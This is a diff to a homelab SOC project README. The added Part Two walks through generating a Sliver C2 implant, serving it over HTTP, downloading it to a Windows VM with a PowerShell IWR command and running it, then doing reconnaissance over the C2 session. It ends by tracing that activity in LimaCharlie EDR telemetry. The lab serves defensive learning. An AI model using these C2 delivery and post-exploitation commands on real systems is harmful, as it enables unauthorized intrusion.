@@ -27,9 +27,8 @@ Setting up 2 VM machine to mimic a SOC environment. One Kali Linux VM to emulate
 <h2>Program walk-through:</h2>
 
 
-<h3>Part Three (Emulating an adversary):</h3>
+
 <h3>Part Four (Blocking an attack):</h3>
-<h3>Part Five (False Positive tuning in LimaCharlie):</h3>
 <h3>Part Six (Detection rule & YARA scans):</h3>
 <br/>
 <br/>
@@ -133,8 +132,67 @@ Now ths will be our last step for our Part one: <br/>
 <br />
 <br />
 <br />
-<h3>Part Two (Generating C2 Payload):</h3>
+<h3>Part Two (Generating C2 Payload & LimaCharlie Telemtry):</h3>
 <br />
+We drop into a root shell and change directory to our sliver install: "sudo su" > cd "/opt/sliver" <br/>
+<img src="https://i.imgur.com/j8O21Vc.png"/> 
+Launch Sliver server with this command "sliver-server" <br/>
+<img src="https://i.imgur.com/zwH9oab.png"/> 
+<br /> 
+Now we Generate our first C2 session payload > wihtin our sliver shell we type this command and be sure to to use our Ubuntu IP: "generate --http [Linux_VM_IP] --save /opt/sliver" > Confirm the new implant config with "implant" command <br/>
+<img src="https://i.imgur.com/wKazdBz.png"/>
+Now we successfully have a C2 payload that we can drop onto our Windows VM. We can exit our Sliver server for now and type "exit" <br/>
+Now moving to downloading our C2 payload from our Ubuntu VM to the Windows VM.<br/>
+Type in this command "cd /opt/sliver/" > and then type this command to temporarily spin up a web server "python3 -m http.server 80" <br/>
+Now switching to our Windows VM we have to launch Admin Powershell console. Enter this command on our Powershell console "IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe" <br/>
+<img src="https://i.imgur.com/aaTzpPZ.png"/>
+<br />
+Starting our C2 session > stop our python we server > then relaunch sliver by typing "sliver-server"  <br/>
+Starting the Sliver HTTP listener by entering this command "http" <br/>
+<img src="https://i.imgur.com/ouSY73n.png"/>
+<br/>
+we return to our Windows CM and execute the C2 payload from our downloads folder using the same Administrator command prompt. Type in this command "C:\Users\Win10 Ent\Downloads\PEACEFUL_TRACK.exe" <br/>
+We can verify our sliver session by using the "session" command and taking note of the session ID. <br/>
+<img src="https://i.imgur.com/qacqG0g.png"/>
+<br />
+To interact with our new C2 sessions we can type the following command "use[session_id]" make sure to put the session ID of your C2 payload <br/>
+Now we are directly interacting with our C2 session on the Windows VM. I am going to run few basic commands just get basic infor or bearings on our victim's host. Use the following command: "info" > "whoami" > "getprivs" <br/>
+<img src="https://i.imgur.com/TaXgJzS.png"/>
+ <br />
+With the "getprivs" command we can see that our C2 payload was implanted properly running with Admin rights. as a proof we can check the "SeDebugPrivilege" enabled. showing that we are on the right track. <br/>
+<img src="https://i.imgur.com/w4p7Hcy.png"/>
+ <br />
+Typing in the "netstat" command we can examine network connections occurring on the remote systems. Notice that sliver highlights it's own process in green. <br/>
+ <br />
+<img src="https://i.imgur.com/qHt7mmn.png"/>
+ <br />
+Typing the "ps -T" command we can identify running processes on the remote system. We can see that Sliver cleverly highights it's own process in green and any detected countermeasures or defensive tools in red. <br/>
+<img src="https://i.imgur.com/BloIdRV.png"/>
+<br /> 
+Now With all that we can Observe what we have so far checking our EDR Telemetry. <br/>
+Let's go back to our LimaCharli'es web UI. > click "sensors" on the left menu and then click on our active windows sensor > after that click "Processes" on the left menu. <br/>
+One of the easiest ways to spot unusual processes is to simply look for ones that are NOT signed. <br/>
+<img src="https://i.imgur.com/3NlMLgG.png"/>
+<br/>
+Moving on we go to our "Network tab on the left. Where we can search for our implant name of C2 IP addr. <br/>
+<img src="https://i.imgur.com/FkOrfSJ.png"/>
+<br/>
+We can also click on "File System" on the left tab menu. Brows to the location we know where our implant is running from. and then once we find it we can inspect the hash of the suspicious executable by scanning it with VirusTotal. <br/>
+<img src="https://i.imgur.com/luMyRqv.png"/>
+<img src="https://i.imgur.com/wjkoMhe.png"/>
+NOTE: “Item not found” on VT does not mean that this file is innocent, just that it’s never been seen before by VirusTotal. This makes sense because we just generated this payload ourselves, so of course it’s not likely to be seen by VirusTotal before. <br/>
+<br />
+Click “Timeline” on the left-side menu of our sensor. This is a near real-time view of EDR telemetry + event logs streaming from this system. <br/>
+<img src="https://i.imgur.com/C8w7mo3.png"/>
+<br /> 
+<h3>Part Three (Emulating an adversary):</h3>
+<br />
+
+
+
+
+
+
 
 
 </p>
